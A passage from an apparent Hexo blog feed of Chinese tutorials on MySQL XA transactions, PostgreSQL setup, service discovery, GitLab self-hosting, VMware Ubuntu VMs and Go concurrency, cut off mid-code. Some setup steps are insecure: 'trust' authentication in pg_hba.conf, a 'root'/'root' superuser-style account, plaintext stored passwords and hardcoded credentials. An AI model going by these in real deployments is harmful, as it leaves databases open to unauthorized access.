<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="variable">$dbtest1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;172.20.101.17&quot;</span>,<span class="string">&quot;public&quot;</span>,<span class="string">&quot;public&quot;</span>,<span class="string">&quot;dbtest1&quot;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;dbtest1 连接失败&quot;</span>);</span><br><span class="line"><span class="variable">$dbtest2</span>     = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;172.20.101.18&quot;</span>,<span class="string">&quot;public&quot;</span>,<span class="string">&quot;public&quot;</span>,<span class="string">&quot;dbtest2&quot;</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;dbtest2 连接失败&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//为XA事务指定一个id，xid 必须是一个唯一值。</span></span><br><span class="line"><span class="variable">$xid</span> = <span class="title function_ invoke__">uniqid</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个库指定同一个事务id，表明这两个库的操作处于同一事务中</span></span><br><span class="line"><span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA START &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);<span class="comment">//准备事务1</span></span><br><span class="line"><span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA START &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);<span class="comment">//准备事务2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//$dbtest1</span></span><br><span class="line">    <span class="variable">$return</span> = <span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE member SET name=&#x27;唐大麦&#x27; WHERE id=1&quot;</span>) ;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$return</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;库dbtest1@172.20.101.17执行update member操作失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//$dbtest2</span></span><br><span class="line">    <span class="variable">$return</span> = <span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;UPDATE memberpoints SET point=point+10 WHERE memberid=1&quot;</span>) ;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$return</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;库dbtest1@172.20.101.18执行update memberpoints操作失败！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//阶段1：$dbtest1提交准备就绪</span></span><br><span class="line">    <span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA END &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA PREPARE &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//阶段1：$dbtest2提交准备就绪</span></span><br><span class="line">    <span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA END &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA PREPARE &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//阶段2：提交两个库</span></span><br><span class="line">    <span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA COMMIT &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA COMMIT &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">//阶段2：回滚</span></span><br><span class="line">    <span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA ROLLBACK &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;XA ROLLBACK &#x27;<span class="subst">$xid</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbtest1</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$dbtest2</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="XA的性能问题"><a href="#XA的性能问题" class="headerlink" title="XA的性能问题"></a>XA的性能问题</h2><p>XA的性能很低。一个数据库的事务和多个数据库间的XA事务性能对比可发现，性能差10倍左右。因此要尽量避免XA事务，例如可以将数据写入本地，用高性能的消息系统分发数据。或使用数据库复制等技术。只有在这些都无法实现，且性能不是瓶颈时才应该使用XA。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>Postgresql 使用介绍</title>
    <url>/2019/10/postgresql-usage/</url>
    <content><![CDATA[<h2 id="Postgresql-安装"><a href="#Postgresql-安装" class="headerlink" title="Postgresql 安装"></a>Postgresql 安装</h2><p>Windows, MAC Install</p>
<p>Postgresql 下载地址： <span class="exturl" data-url="aHR0cHM6Ly93d3cuZW50ZXJwcmlzZWRiLmNvbS9kb3dubG9hZHMvcG9zdGdyZXMtcG9zdGdyZXNxbC1kb3dubG9hZHM=">https://www.enterprisedb.com/downloads/postgres-postgresql-downloads<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<p>Linux Install</p>
<ol>
<li>sudo apt-get update</li>
<li>sudo apt-get install postgresql postgresql-client</li>
<li>sudo -i -u postgres</li>
<li>psql</li>
<li>systemctl start postgresql.service # 开启</li>
<li>systemctl stop postgresql.service # 关闭</li>
<li>systemctl restart postgresql.service # 重启</li>
<li>\password postgres # 修改密码</li>
<li>\q # 退出</li>
</ol>
<h2 id="Postgresql-命令"><a href="#Postgresql-命令" class="headerlink" title="Postgresql 命令"></a>Postgresql 命令</h2><ol>
<li>psql -h localhost -p 5432 -U postgres chitchat</li>
<li>\h # 帮助</li>
<li>\l # 显示数据库</li>
<li>\c # 选择数据库</li>
<li>\d # 显示数据表</li>
<li>\? # 命令帮助</li>
</ol>
<h2 id="Postgresql-权限"><a href="#Postgresql-权限" class="headerlink" title="Postgresql 权限"></a>Postgresql 权限</h2><ol>
<li>CREATE USER root WITH PASSWORD ‘root’;</li>
<li>GRANT ALL PRIVILEGES ON DATABASE chitchat TO root; # 赋值数据库权限</li>
<li>GRANT ALL PRIVILEGES ON users TO root; # 赋值数据表权限</li>
<li>ALTER USER myuser WITH SUPERUSER; # 可选的，权限赋值太大（创建用户和数据库等）</li>
<li>GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public to root; # 所有表</li>
<li>GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public to root; # 所有表</li>
<li>GRANT ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public to root; # 所有表</li>
</ol>
<h2 id="Postgresql-Golang-连接"><a href="#Postgresql-Golang-连接" class="headerlink" title="Postgresql Golang 连接"></a>Postgresql Golang 连接</h2><ol>
<li>vim &#x2F;etc&#x2F;postgresql&#x2F;10&#x2F;main&#x2F;pg_hba.conf # 以下修改</li>
<li>systemctl restart postgresql.service</li>
</ol>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">...... </span><br><span class="line"></span><br><span class="line">host <span class="keyword">all</span> <span class="keyword">all</span> <span class="number">127.0</span>.<span class="number">0.1</span>/<span class="number">32</span> md5 </span><br><span class="line"></span><br><span class="line">## <span class="keyword">fix</span> <span class="keyword">to</span> </span><br><span class="line"></span><br><span class="line">host <span class="keyword">all</span> <span class="keyword">all</span> <span class="number">127.0</span>.<span class="number">0.1</span>/<span class="number">32</span> trust </span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="Postgresql-操作"><a href="#Postgresql-操作" class="headerlink" title="Postgresql 操作"></a>Postgresql 操作</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">  id         serial <span class="keyword">primary</span> key,</span><br><span class="line">  uuid       <span class="type">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>,</span><br><span class="line">  name       <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">  email      <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>,</span><br><span class="line">  password   <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">  created_at <span class="type">timestamp</span> <span class="keyword">not</span> <span class="keyword">null</span>   </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (uuid, name, email, password, created_at) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;slagga&#x27;</span>, <span class="string">&#x27;slagga@qq.com&#x27;</span>, <span class="string">&#x27;slagga&#x27;</span>, <span class="string">&#x27;2007-12-13&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

<h2 id="Postgresql-Golang-使用"><a href="#Postgresql-Golang-使用" class="headerlink" title="Postgresql Golang 使用"></a>Postgresql Golang 使用</h2><p>代码运行</p>
<ol>
<li>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhdXNoZW9uZy9nd3A=">https://github.com/sausheong/gwp<i class="fa fa-external-link-alt"></i></span></li>
<li>mv Chapter_2_Go_ChitChat src</li>
<li>export GOPATH&#x3D;$GOPATH:&#x2F;root&#x2F;code&#x2F;gwp</li>
<li>cd src &amp;&amp; go install chitchat</li>
<li>cp -R config.json public templates ..&#x2F;bin&#x2F;</li>
<li>cd ..&#x2F;bin &amp;&amp; nohup .&#x2F;chitchat &amp;</li>
<li>curl localhost:8080</li>
<li>curl <span class="exturl" data-url="aHR0cDovLzQ3LjI0NC4xMjYuODU6ODA4MC8=">http://47.244.126.85:8080<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">db, err = sql.Open<span class="params">(&quot;postgres&quot;, &quot;<span class="attr">port</span>=5432 <span class="attr">user</span>=postgres <span class="attr">password</span>=postgres <span class="attr">dbname</span>=chitchat <span class="attr">sslmode</span>=disable&quot;)</span></span><br></pre></td></tr></table></figure>

<h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9wb3N0Z3Jlc3FsL2xpbnV4LWluc3RhbGwtcG9zdGdyZXNxbC5odG1s">https://www.runoob.com/postgresql/linux-install-postgresql.html<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Postgresql</category>
      </categories>
  </entry>
  <entry>
    <title>服务发现的基本原理 (redis, zk, etcd, consul)</title>
    <url>/2019/10/service-discovery/</url>
    <content><![CDATA[<h2 id="什么是服务发现？"><a href="#什么是服务发现？" class="headerlink" title="什么是服务发现？"></a>什么是服务发现？</h2><p>服务发现并没有怎样的高深莫测，它的原理再简单不过。只是市面上太多文章将服务发现的难度妖魔化，读者被绕的云里雾里，顿觉自己智商低下不敢高攀。</p>
<span id="more"></span>

<p>服务提供者是什么，简单点说就是一个 HTTP 服务器，提供了 API 服务，有一个 IP 端口作为服务地址。服务消费者是什么，它就是一个简单的进程，想要访问服务提供者提供的服务来干一些事情。一个 HTTP 服务器既可以是服务提供者对外提供服务，也可以是消费者需要别的服务提供者提供的服务，这就是服务依赖，没有你我就不是我自己。复杂的服务甚至有多个服务依赖。</p>
<p>服务发现有三个角色，服务提供者、服务消费者和服务中介。服务中介是联系服务提供者和服务消费者的桥梁。服务提供者将自己提供的服务地址注册到服务中介，服务消费者从服务中介那里查找自己想要的服务的地址，然后享受这个服务。服务中介提供多个服务，每个服务对应多个服务提供者。</p>
<p>服务中介就是一个字典，字典里有很多 key&#x2F;value 键值对，key 是服务名称，value 是服务提供者的地址列表。服务注册就是调用字典的 Put 方法塞东西，服务查找就是调用字典的 Get 方法拿东西。</p>
<p>当服务提供者节点挂掉时，要求服务能够及时取消注册，比便及时通知消费者重新获取服务地址。</p>
<p>当服务提供者新加入时，要求服务中介能及时告知服务消费者，你要不要尝试一下新的服务。</p>
<h2 id="Redis-作为服务中介"><a href="#Redis-作为服务中介" class="headerlink" title="Redis 作为服务中介"></a>Redis 作为服务中介</h2><p>Redis 里面有丰富的数据结构，拿来存储服务字典再合适不过了。对每一个服务名称，我们用一个 set 结构存储服务的 IP:Port 字符串。如果服务提供者加入，调用 sadd 命令加入服务地址，如果服务挂掉，调用 srem 命令移除服务地址。对服务消费者使用 smembers 指令获取所有服务地址然后在消费进程里随机挑一个，或者使用 srandmemember 指令直接获取随机服务地址。</p>
<p>这个时候你也许会表示怀疑，服务发现真这么简单么？答案是还差一点，关于上面的这个解决方案有几个问题。</p>
<p>第一个问题是服务提供者进程如果被 kill -9 暴力杀死，不能主动调用 srem 命令怎么办？</p>
<p>这个时候服务列表中多了一个黑地址指向了不存在的服务而消费者完全不知道，这个时候服务中介就成了黑中介了。那该怎么办呢？</p>
<p>我们引入服务保活和检查机制，并更换数据结构。服务提供者需要每隔 5 秒左右向服务中介汇报存活，服务中介将服务地址和汇报时间记录在 zset 数据结构的 value 和 score 中。服务中介需要每隔 10 秒左右检查 zset 数据结构，踢掉汇报时间严重落后的服务地址项。这样就可以准实时地保证服务列表中服务地址的有效性。</p>
<p>第二个问题是服务列表变动时如何通知消费者。有两种解决方案。</p>
<p>第一种是轮询，消费者需要每隔几秒查询服务列表是否有改变。如果服务很多，服务列表很大，消费者很多，redis 会有一定压力。所以这时候可以引入服务列表的版本号机制，给每个服务提供一个 key&#x2F;value 设置服务的版本号，就是在服务列表发生变动时，递增这个版本号。消费者只需要轮询这个版本号的变动即可知道服务列表是否发生了变化。因为服务列表比较稳定，仅在网络严重抖动的情况下才会频繁发生变动，所以 redis 几乎没有压力。</p>
<p>第二种是采用 pubsub。这种方式及时性要明显好于轮询。缺点是每个 pubsub 都会占用消费者一个线程和一个额外的 redis 连接。为了减少对线程和连接的浪费，我们使用单个 pubsub 广播全局版本号的变动。所谓全局版本号就是任意服务列表发生了变动，这个版本号都会递增。接收到版本变动的消费者再去检查各自的依赖服务列表的版本号是否发生了变动。这种全局版本号也可以用于第一种轮询方案。</p>
<p>第三个问题是 redis 是单点的，如果挂掉了怎么办？</p>
<p>这是个大问题。正是因为这个问题的存在，流行的服务发现系统都是使用分布式数据库 zookeeper&#x2F;etcd&#x2F;consul 等来作为服务中介，它们是分布式的多节点的，挂掉了一个节点没关系，系统仍然可以正常工作。</p>
<p>那如果整个 zk 集群挂掉会怎样呢？其实每个服务消费者在本地内存里都会存一份当前的服务列表，即使服务中介集群挂掉，也是可以使用当前的服务列表正常工作的。</p>
<p>那 redis 作为服务中介就真的不靠谱了么？其实还有个 redis-sentinel 可以消除 redis 的单点问题，redis-sentinel 可以在主节点挂掉的时候，自动升级从节点为主节点。所以拿 redis 干这件事也是可以的。用 redis 干服务发现确实非常简单，虽然这种方式非常不流行。</p>
<h2 id="服务提供者不只是-HTTP-服务"><a href="#服务提供者不只是-HTTP-服务" class="headerlink" title="服务提供者不只是 HTTP 服务"></a>服务提供者不只是 HTTP 服务</h2><p>上面提到服务提供者简单来说就是 HTTP 服务器，其实服务多种多样。可以是数据库服务，可以是 RPC 服务，可以是 UDP 服务等等。</p>
<p>如果是 MySQL 数据库，那如何将 MySQL 服务注册到服务中介呢？原生的 MySQL 可没有提供这样功能。一般做法是提供一个 Agent 代理去注册。这个代理除了将服务地址注册到服务中介外，还需要监控 MySQL 的健康状况，以便当 MySQL 宕机时能及时切换到新的 MySQL 服务地址。一般这个 Agent 为了节省资源而不止监控一个数据库，它可以同时监控多个数据库，甚至是多种数据库。</p>
<h2 id="服务配置重加载"><a href="#服务配置重加载" class="headerlink" title="服务配置重加载"></a>服务配置重加载</h2><p>服务发现一般只是用来注册和查找服务列表这样一个比较单纯的功能。不过现代的服务发现系统还会集成服务配置管理功能。这样可以实现服务配置的实时重加载。原理也很简单，就是对于每一个服务项，服务中介还会存储一个单独的 key&#x2F;value 用来存储这个服务的配置信息。当这个配置项在后台被修改时，服务中介会实时通知相关服务器变更配置信息。比如数据库地址变动，业务参数修改等。</p>
<h2 id="服务管理后台"><a href="#服务管理后台" class="headerlink" title="服务管理后台"></a>服务管理后台</h2><p>为了便于服务管理，一般服务发现还会提供一个服务管理后台，用于管理人员查看服务集群的状态。如果服务注册和汇报时提供冗余的配置信息，服务管理后台就可以呈现更为详细的服务信息。服务管理后台还可以将所有的服务依赖组织起来，呈现出一颗漂亮的服务依赖树。</p>
<h2 id="服务发现的一个简单实现"><a href="#服务发现的一个简单实现" class="headerlink" title="服务发现的一个简单实现"></a>服务发现的一个简单实现</h2><p>小编在闲暇之余基于 Redis 实现了一个简单的服务发现系统 Captain。读者可以去 github 上下载这个项目进行学习。我除了编写了服务发现的服务器之外，客户端 sdk 也一块做了开发，可能不太稳定，希望读者体谅，不要用于线上的业务系统。</p>
<p>在 Captain 这个项目里，我的服务发现服务器将 Redis 提供的服务做了一层封装，对外提供 HTTP API 进行服务的注册和查找，没有使用上文提到的 pubsub 功能。</p>
]]></content>
      <categories>
        <category>Software</category>
      </categories>
  </entry>
  <entry>
    <title>Gitlab 自建服务器仓库</title>
    <url>/2019/11/gitlab-build-repository/</url>
    <content><![CDATA[<h4 id="所需操作系统"><a href="#所需操作系统" class="headerlink" title="所需操作系统"></a>所需操作系统</h4><ul>
<li>在教程开始之前，是不是很多人搜索过：Windows下GitLab服务器搭建？答案是没有，GitLab只针对Unix类系统做了开发。</li>
<li>当然，GitLab本身就是Git的衍生品，如果你非要在Windows下搭建Git服务器，那么Git的其他衍生品如Gitblit是可以完成的。</li>
</ul>
<span id="more"></span>

<h4 id="Git的优点和缺点介绍"><a href="#Git的优点和缺点介绍" class="headerlink" title="Git的优点和缺点介绍"></a>Git的优点和缺点介绍</h4><ul>
<li>优点<ul>
<li>适合分布式开发，强调个体</li>
<li>公共服务器压力和数据量都不会太大</li>
<li>速度快、灵活</li>
<li>任意两个开发者之间可以很容易的解决冲突</li>
<li>离线可以正常提交代码和工作</li>
</ul>
</li>
<li>缺点<ul>
<li>学习周期相对而言比较长</li>
<li>不符合常规思维</li>
<li>代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息</li>
</ul>
</li>
</ul>
<h4 id="Gitlab-安装"><a href="#Gitlab-安装" class="headerlink" title="Gitlab 安装"></a>Gitlab 安装</h4><ul>
<li>Git 安装<ul>
<li>$ apt update </li>
<li>$ apt install git</li>
</ul>
</li>
<li>安装依赖包<ul>
<li>$ sudo apt-get install curl openssh-server ca-certificates postfix</li>
<li>OK—&gt;InternetSite—&gt;OK, 默认就行</li>
</ul>
</li>
<li>安装主程序<ul>
<li>利用<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3IudHVuYS50c2luZ2h1YS5lZHUuY24vaGVscC9naXRsYWItY2U=">清华大学的镜像<i class="fa fa-external-link-alt"></i></span>，来进行主程序的安装</li>
<li>首先信任 GitLab 的 GPG 公钥  <figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">$ curl https://packages.gitlab.com/gpg.<span class="keyword">key</span> 2&gt; /dev/<span class="keyword">null</span> | sudo apt-<span class="keyword">key</span> <span class="keyword">add</span> - &amp;&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure></li>
<li>Ubuntu 18.04 LTS, 添加安装包地址  <figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>echo <span class="string">&quot;deb http://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/debian stretch main&quot;</span> &gt;&gt; <span class="regexp">/etc/apt</span><span class="regexp">/sources.list.d/gitlab</span>-ce.list</span><br></pre></td></tr></table></figure></li>
<li>安装 gitlab-ce  <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> update</span><br><span class="line">$ sudo apt-<span class="built_in">get</span> install gitlab-ce</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>修改配置  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/gitlab/gitlab.rb</span></span><br></pre></td></tr></table></figure>
  更改 external_url&#x3D;<span class="exturl" data-url="aHR0cDovLzQ3LjI0NC4xMjYuODUv">http://47.244.126.85<i class="fa fa-external-link-alt"></i></span> (IP换成你本机的IP地址，内网和外网都可以)</li>
<li>启动sshd和postfix服务  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> service sshd <span class="built_in">start</span></span><br><span class="line"><span class="variable">$</span> service postfix <span class="built_in">start</span></span><br></pre></td></tr></table></figure></li>
<li>添加防火墙规则  <figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">$ sudo iptables -A <span class="keyword">INPUT</span> -p tcp -m tcp <span class="comment">--dport 80 -j ACCEPT</span></span><br></pre></td></tr></table></figure></li>
<li>启动各项服务  <figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure></li>
<li>查看gitlab状态  <figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo gitlab-ctl status</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Gitlab-Usage"><a href="#Gitlab-Usage" class="headerlink" title="Gitlab Usage"></a>Gitlab Usage</h4><ul>
<li>打开浏览器访问 <code>http://your-ip-address</code></li>
<li>默认第一访问需要修改初始密码</li>
</ul>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware本地部署Ubuntu虚拟机集群</title>
    <url>/2019/11/vmware-deploy-ubuntu/</url>
    <content><![CDATA[<h4 id="VMware-For-Mac"><a href="#VMware-For-Mac" class="headerlink" title="VMware For Mac"></a>VMware For Mac</h4><ul>
<li>打开浏览器，进入 <span class="exturl" data-url="aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi5odG1s">VMare官网<i class="fa fa-external-link-alt"></i></span></li>
<li>点击产品，个人桌面，<span class="exturl" data-url="aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi9wcm9kdWN0cy9mdXNpb24uaHRtbA==">Fusion For Mac<i class="fa fa-external-link-alt"></i></span></li>
<li>点击 <span class="exturl" data-url="aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi9wcm9kdWN0cy9mdXNpb24vZnVzaW9uLWV2YWx1YXRpb24uaHRtbA==">立即下载<i class="fa fa-external-link-alt"></i></span></li>
<li>点击 <span class="exturl" data-url="aHR0cHM6Ly93d3cudm13YXJlLmNvbS9nby9nZXRmdXNpb24=">立即下载<i class="fa fa-external-link-alt"></i></span></li>
<li>如果需要登录，请注册登陆后进行下载</li>
</ul>
<span id="more"></span>

<h4 id="VMware-For-Windows"><a href="#VMware-For-Windows" class="headerlink" title="VMware For Windows"></a>VMware For Windows</h4><ul>
<li>打开浏览器，进入 <span class="exturl" data-url="aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi5odG1s">VMare官网<i class="fa fa-external-link-alt"></i></span></li>
<li>点击下载，选择 <span class="exturl" data-url="aHR0cHM6Ly9teS52bXdhcmUuY29tL2NuL3dlYi92bXdhcmUvaW5mby9zbHVnL2Rlc2t0b3BfZW5kX3VzZXJfY29tcHV0aW5nL3Ztd2FyZV93b3Jrc3RhdGlvbl9wcm8vMTVfMA==">Workstation Pro<i class="fa fa-external-link-alt"></i></span></li>
<li>选择<br>VMware Workstation 15.5.0 Pro for Windows 转至下载</li>
<li>如果需要登录，请注册登陆后进行下载</li>
<li>可以装在D盘，如果C盘容量小的话</li>
</ul>
<h4 id="Ubuntu-18-04"><a href="#Ubuntu-18-04" class="headerlink" title="Ubuntu-18.04"></a>Ubuntu-18.04</h4><ul>
<li>进入 <span class="exturl" data-url="aHR0cHM6Ly91YnVudHUuY29tLw==">Ubuntu官网<i class="fa fa-external-link-alt"></i></span></li>
<li>点击Download，选择 <span class="exturl" data-url="aHR0cHM6Ly91YnVudHUuY29tL2Rvd25sb2FkL3NlcnZlcg==">Ubuntu Server<i class="fa fa-external-link-alt"></i></span></li>
<li>选择Ubuntu Server 18.04.3 LTS，点击Download</li>
<li>下载完成后，可以移动到D盘中，如果是Windows系统</li>
</ul>
<h4 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h4><ul>
<li>打开VMware新建虚拟机，有普通配置和自定义高级配置两种方式</li>
<li>对于不太熟悉的开发者，普通配置即可</li>
<li>Full-Name 就是面板上的虚拟机名称</li>
<li>Server-Name 为你在服务器中登陆的名字</li>
<li>密码和确认密码 为你在服务器中登录的密码</li>
<li>其他的配置一路默认即可</li>
</ul>
<h4 id="运行虚拟机"><a href="#运行虚拟机" class="headerlink" title="运行虚拟机"></a>运行虚拟机</h4><ul>
<li>选中控制面板上的虚拟机，点击Start Up Guest</li>
<li>其中你可以设置Proxy-Url，这个为你在服务器中使用Curl, Wget等，可以进行网络加速</li>
<li>Apt-Origin-Repository-Url，为你提供一个安装Linux工具的镜像库，可以更快速的下载库文件</li>
<li>配置登录用户名，登录密码，确认登陆密码</li>
<li>配置中有一个暴漏给，其他主机访问的名字，建议以负载的形式进行命名</li>
</ul>
<h4 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h4><ul>
<li>使用配置的用户名登陆成功后，切换到root用户 <code>$ sudo -i</code></li>
<li>更新镜像库， apt update和apt upgrade</li>
<li>安装远程登录工具ssh<ul>
<li>$ ps -ef | grep ssh</li>
<li>$ apt-get install openssh-server</li>
<li>$ ps -ef | grep ssh</li>
<li>$ service sshd stop</li>
<li>$ service sshd start</li>
<li>$ ifconfig</li>
<li>接下来就可以使用内网地址和配置中的用户名，密码登录了</li>
</ul>
</li>
</ul>
<h4 id="虚拟机内网测试"><a href="#虚拟机内网测试" class="headerlink" title="虚拟机内网测试"></a>虚拟机内网测试</h4><ul>
<li>在第一台服务器中输入，<code>$ nc -lp 80</code></li>
<li>在第二胎服务器中输入，<code>$ telnet 192.168.75.131 80</code></li>
<li>如果连接成功，说明内网可用，服务器是可以连接的</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Go 语言中管理 Concurrency 的三种方式</title>
    <url>/2021/01/go-concurrency/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>相信大家踏入 Go 语言的世界，肯定是被强大的并发（Concurrency）所吸引，Go 语言用最简单的关键字go就可以将任务丢到后台处理，但是开发者怎么有效率的控制并发。</p>
<p>这是入门 Go 语言必学的技能，本章会介绍几种方式来带大家认识并发，而这三种方式分别对应到三个不同的名词：WaitGroup，Channel，及 Context。下面用简单的范例带大家了解。</p>
<span id="more"></span>

<h2 id="WaitGroups"><a href="#WaitGroups" class="headerlink" title="WaitGroups"></a>WaitGroups</h2><p>先来了解有什么情境需要使用到 WaitGroup，假设您有两台机器需要同时上传最新的代码，两台机器分别上传完成后，才能执行最后的重启步骤。就像是把一个工作同时拆成好几份同时一起做，可以减少时间，但是最后需要等到全部做完，才能执行下一步，这时候就需要用到 WaitGroup 才能做到。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line">    wg.Add(<span class="number">3</span>) <span class="comment">//task count wait to do</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span 